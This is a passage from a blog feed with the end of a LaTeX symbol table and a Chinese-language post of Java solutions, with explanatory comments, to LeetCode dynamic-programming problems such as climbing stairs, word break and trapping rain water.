<td>\Pi</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\ge$</td>
<td>\ge</td>
</tr>
<tr>
<td>$\le$</td>
<td>\le</td>
</tr>
<tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\exist$</td>
<td>\exist</td>
</tr>
<tr>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\bar{A}$</td>
<td>\bar{A}</td>
</tr>
<tr>
<td>$\odot$</td>
<td>\odot</td>
</tr>
<tr>
<td>$\circ$</td>
<td>\circ</td>
</tr>
<tr>
<td>$\cong$</td>
<td>\cong</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\overline{x+y}$</td>
<td>\overline</td>
</tr>
<tr>
<td>$\underline{x+y}$</td>
<td>\underline</td>
</tr>
<tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
<tr>
<td>$a\qquad b$</td>
<td>\qquad</td>
</tr>
<tr>
<td>$\ast$</td>
<td>\ast</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\bullet$</td>
<td>\bullet</td>
</tr>
<tr>
<td>$\lhd$</td>
<td>\lhd</td>
</tr>
<tr>
<td>$\unlhd$</td>
<td>\unlhd</td>
</tr>
<tr>
<td>$\rhd$</td>
<td>\rhd</td>
</tr>
<tr>
<td>$\unrhd$</td>
<td>\unrhd</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234015.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode</title>
    <url>/2021/12/21/LeetCode/</url>
    <content><![CDATA[<p>[TOC]</p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="70-爬楼梯-x2F-x2F-x2F"><a href="#70-爬楼梯-x2F-x2F-x2F" class="headerlink" title="70. 爬楼梯&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/climbing-stairs/">70. 爬楼梯</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="comment">// 最后一步可能跨了一级台阶，也可能跨了两级台阶，所以可以列出如下式子:f(x)=f(x−1)+f(x−2)</span></span><br><span class="line"><span class="comment">// 使用滚动数组思想</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>; <span class="comment">// p和q初始化为0, r表示f(0)=1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      p = q;</span><br><span class="line">      q = r;</span><br><span class="line">      r = p + q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-最长回文子串-x2F-x2F-x2F"><a href="#5-最长回文子串-x2F-x2F-x2F" class="headerlink" title="5. 最长回文子串&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">5. 最长回文子串</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//频繁使用s.charAt(i)的话时间会更长,可以转化为charArray</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len][len];</span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLen</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; j ; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (charArray[i] == charArray[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[i + <span class="number">1</span>][j - <span class="number">1</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">                            dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxLen) &#123;</span><br><span class="line">                    start = i;</span><br><span class="line">                    maxLen = j - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="53-最大子序和-x2F-x2F"><a href="#53-最大子序和-x2F-x2F" class="headerlink" title="53. 最大子序和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/">53. 最大子序和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxSum</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                sum = sum + nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            maxSum = Math.max(sum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="121-买卖股票的最佳时机-x2F-x2F-x2F-x2F"><a href="#121-买卖股票的最佳时机-x2F-x2F-x2F-x2F" class="headerlink" title="121. 买卖股票的最佳时机&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//时刻更新start位置</span></span><br><span class="line"><span class="comment">//动态规划 前i天的最大收益 = max&#123;前i-1天的最大收益，第i天的价格-前i-1天中的最小价格&#125;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; min) &#123;</span><br><span class="line">                min = prices[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max = Math.max(max, prices[i] - min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="122-买卖股票的最佳时机-II"><a href="#122-买卖股票的最佳时机-II" class="headerlink" title="122. 买卖股票的最佳时机 II"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii">122. 买卖股票的最佳时机 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只要第二天比第一天大就买, </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &gt; prices[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                res += prices[i] - prices[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="62-不同路径-x2F-x2F-x2F"><a href="#62-不同路径-x2F-x2F-x2F" class="headerlink" title="62. 不同路径&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/unique-paths/">62. 不同路径</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>] + dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排列组合</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// 只跟第几行第几列有关,从m + n - 2步中抽出m - 1步</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Math.min(m - <span class="number">1</span>, n - <span class="number">1</span>); i++) &#123;</span><br><span class="line">      ans *= m + n - <span class="number">2</span> - i;</span><br><span class="line">      ans /= i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="139-单词拆分-x2F"><a href="#139-单词拆分-x2F" class="headerlink" title="139. 单词拆分&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break/">139. 单词拆分</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="comment">// dp</span></span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 初始化0值</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 用一个set来存单词列表</span></span><br><span class="line">        Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordDict);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 然后遍历</span></span><br><span class="line">        <span class="comment">// dp[i]表示字符串s的前i个字符能否拆分成wordDict</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length() + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j , i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="140-单词拆分-II-x2F-x2F"><a href="#140-单词拆分-II-x2F-x2F" class="headerlink" title="140. 单词拆分 II&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break-ii/">140. 单词拆分 II</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划 + 回溯</span></span><br><span class="line"><span class="comment">// 先用动态规划判断是否有解,然后再用回溯输出所有解</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordDict);</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j, i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (dp[len]) &#123;</span><br><span class="line">            LinkedList&lt;String&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">            dfs(res, <span class="number">0</span>, len, s, wordSet, path, dp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(List&lt;String&gt; res, <span class="type">int</span> start, <span class="type">int</span> len, String s, Set&lt;String&gt; wordSet, LinkedList&lt;String&gt; path,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span>[] dp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == len) &#123;</span><br><span class="line">            res.add(String.join(<span class="string">&quot; &quot;</span>, path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> s.substring(start, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (wordSet.contains(prefix)) &#123;</span><br><span class="line">                path.addLast(prefix);</span><br><span class="line">                dfs(res, i + <span class="number">1</span>, len, s, wordSet, path, dp);</span><br><span class="line">                path.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="44-通配符匹配-x2F-x2F"><a href="#44-通配符匹配-x2F-x2F" class="headerlink" title="44. 通配符匹配&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/wildcard-matching/">44. 通配符匹配</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j] | dp[i - <span class="number">1</span>][j - <span class="number">1</span>] || dp[i][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-19-正则表达式匹配"><a href="#剑指-Offer-19-正则表达式匹配" class="headerlink" title="剑指 Offer 19. 正则表达式匹配"></a><a href="https://leetcode-cn.com/problems/zheng-ze-biao-da-shi-pi-pei-lcof/">剑指 Offer 19. 正则表达式匹配</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (pc.length &gt; <span class="number">1</span> &amp;&amp; pc[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] |= dp[i - <span class="number">1</span>][j];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                        dp[i][j] = dp[i - <span class="number">2</span>][j] | dp[i][j];</span><br><span class="line">                        <span class="keyword">if</span> (pc[i - <span class="number">2</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                            dp[i][j] |= dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                            dp[i][j] |= dp[i][j - <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="42-接雨水-x2F-x2F"><a href="#42-接雨水-x2F-x2F" class="headerlink" title="42. 接雨水&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/trapping-rain-water/">42. 接雨水</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态规划,首先用两个数组，max_left [i]代表第 i 列左边最高的墙的高度，max_right[i] 代表第 i 列右边最高的墙的高度。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span>[] maxL = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] maxR = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            maxL[i] = Math.max(maxL[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxR[i] = Math.max(maxR[i + <span class="number">1</span>], height[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= maxL[i] || height[i] &gt;= maxR[i]) <span class="keyword">continue</span>;</span><br><span class="line">            res = res + Math.min(maxL[i],maxR[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[height.length];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span 